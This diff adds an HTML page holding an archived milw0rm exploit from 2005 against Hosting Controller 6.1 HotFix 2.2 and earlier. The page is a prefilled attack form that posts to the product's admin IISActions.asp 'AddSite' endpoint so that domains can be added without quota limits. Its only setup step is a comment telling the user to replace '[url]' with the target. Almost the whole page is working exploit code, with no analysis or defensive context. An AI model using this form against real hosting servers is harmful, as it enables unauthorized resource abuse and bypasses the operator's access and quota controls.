@@ -1,0 +1,109 @@
+<html><head><title>Hosting Controller <= 6.1 HotFix 2.2 Add Domain without Quota Exploit</title></head><pre>&lt;!-- Change [url] /str0ke --&gt;
+
+&lt;form method=&quot;post&quot; name=&quot;addform&quot; action=&quot;http://[url]/admin/iis/IISActions.asp?ActionType=AddSite&amp;hostcustid=1&amp;hostingplans=1&quot;&gt;
+&lt;table&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;Contents&quot;&gt;Website Name : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;
+&lt;input type=&quot;text&quot; size=&quot;25&quot; name=&quot;fServerComment&quot;&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;
+ThirdLevelDomainCheck: &lt;/td&gt;&lt;td&gt;&lt;input type=&quot;TEXT&quot; name=&quot;ThirdLevelDomainCheck&quot; value=&quot;FALSE&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;WebUsers: &lt;input type=&quot;TEXT&quot; name=&quot;WebUsers&quot; ID=&quot;WebUsers&quot; value=&quot;YourUsername&quot;&gt;&lt;br&gt;
+hostcustid: &lt;input type=&quot;TEXT&quot; name=&quot;hostcustid&quot; ID=&quot;hostcustid&quot; value=&quot;1&quot;&gt;&lt;tr&gt;
+&lt;td height=&quot;0&quot; colspan=&quot;2&quot;&gt;
+&lt;table width=&quot;100%&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
+&lt;tr class=&quot;LoopListingdark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; Website Type : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;select name=&quot;IPLessCheckBox&quot; id=&quot;IPLessCheckBox&quot;&gt;&lt;option value=&quot;NO&quot;&gt;IP Based Domain&lt;/option&gt;&lt;option value=&quot;YES&quot;&gt;
+       Name Based Domain
+      &lt;/option&gt;&lt;/select&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id=&quot;DivIPBased&quot; style=&quot;font:10px bold;Visibility:Visible&quot;&gt;
+&lt;table width=&quot;100%&quot; ID=&quot;Table1&quot; cellspacing=&quot;1&quot; cellpadding=&quot;0&quot; border=&quot;0&quot; height=&quot;100%&quot;&gt;IPAddress : &lt;input type=&quot;TEXT&quot; name=&quot;fIPAddress&quot; value=&quot;127.0.0.1&quot; ID=&quot;TEXT1&quot;&gt;PortNo :&lt;input type=&quot;TEXT&quot; size=&quot;30&quot; name=&quot;fPortNo&quot; value=&quot;80&quot; ID=&quot;TEXT2&quot;&gt;IPLessDomain: &lt;input type=&quot;TEXT&quot; name=&quot;fIPLessDomain&quot; value=&quot;FALSE&quot; ID=&quot;TEXT3&quot;&gt;&lt;/table&gt;&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan=&quot;2&quot; align=&quot;left&quot;&gt;
+&lt;table width=&quot;100%&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; Mail Access : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;mailaccess&quot; value=&quot;YES&quot; ID=&quot;mailaccess&quot; checked&gt; Enable
+   &lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id=&quot;DivMailAccess&quot; style=&quot;font:10px bold;Visibility:Visible&quot;&gt;
+&lt;table class=&quot;bg2&quot; width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;1&quot;&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt;  Mail Server : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;select id=&quot;Select3&quot; name=&quot;MailServerType&quot;&gt;&lt;option&gt;IMail Server&lt;/option&gt;
+&lt;option&gt;Merak Mail Server&lt;/option&gt;
+&lt;option&gt;MailEnable Server&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; Mail Password : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;mailpassword&quot; name=&quot;mailpassword&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SiteType: &lt;/td&gt;&lt;td&gt;&lt;input type=&quot;TEXT&quot; name=&quot;SiteType&quot; value=&quot;www&quot; ID=&quot;TEXT4&quot;&gt;&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot; colspan=&quot;2&quot;&gt; &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan=&quot;2&quot; align=&quot;left&quot;&gt;
+&lt;div id=&quot;DivAdvSettings&quot; style=&quot;font:10px bold;Visibility:Visible&quot;&gt;
+&lt;table width=&quot;100%&quot; border=&quot;0&quot; ID=&quot;Table3&quot; cellspacing=&quot;1&quot; cellpadding=&quot;1&quot;&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; Allow Anonymous : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;AllowAnon&quot; value=&quot;NO&quot; ID=&quot;Radio1&quot;&gt;No
+        &lt;input type=&quot;radio&quot; name=&quot;AllowAnon&quot; value=&quot;YES&quot; ID=&quot;Radio2&quot; checked&gt;Yes
+       &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; Access Permissions : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;Read&quot; value=&quot;YES&quot; ID=&quot;Checkbox1&quot; checked&gt;Read
+        &lt;input type=&quot;checkbox&quot; name=&quot;Write&quot; value=&quot;YES&quot; ID=&quot;Checkbox2&quot;&gt;Write
+        &lt;input type=&quot;checkbox&quot; name=&quot;Script&quot; value=&quot;YES&quot; ID=&quot;Checkbox3&quot; checked&gt;Script
+       &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;Execute&quot; value=&quot;YES&quot; ID=&quot;Checkbox4&quot;&gt;Execute (Includes Script)
+       &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;DirBrowsing&quot; value=&quot;YES&quot; ID=&quot;Checkbox5&quot;&gt;Directory Browsing Allowed
+       &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;FrontPageWeb&quot; value=&quot;YES&quot; ID=&quot;Checkbox6&quot;&gt; Install FrontPage Extensions
+       &lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt;Enable Default Document : &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;Checkbox&quot; name=&quot;enabledefaultdoc&quot; value=&quot;YES&quot; ID=&quot;Checkbox7&quot; checked&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;looplistingDark&quot;&gt;
+&lt;td width=&quot;19%&quot; class=&quot;contents&quot;&gt; &lt;/td&gt;
+&lt;td width=&quot;73%&quot; class=&quot;contents&quot;&gt;&lt;input type=&quot;Text&quot; name=&quot;defaultdoc&quot; value=&quot;Default.htm,default.asp,index.htm,index.html,index.cfm,index.asp,default.aspx,index.aspx&quot; size=&quot;60&quot; ID=&quot;Text1&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr class=&quot;btnbg&quot;&gt;
+&lt;td width=&quot;73%&quot; align=&quot;right&quot; class=&quot;btnbg&quot; colspan=&quot;2&quot;&gt;
+&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;input type=&quot;submit&quot; class=&quot;butn&quot; name=&quot;Add Site2&quot; value=&quot;  Next  &gt;&gt;  &quot;&gt; &lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+
+# milw0rm.com [2005-07-18]</pre></html>
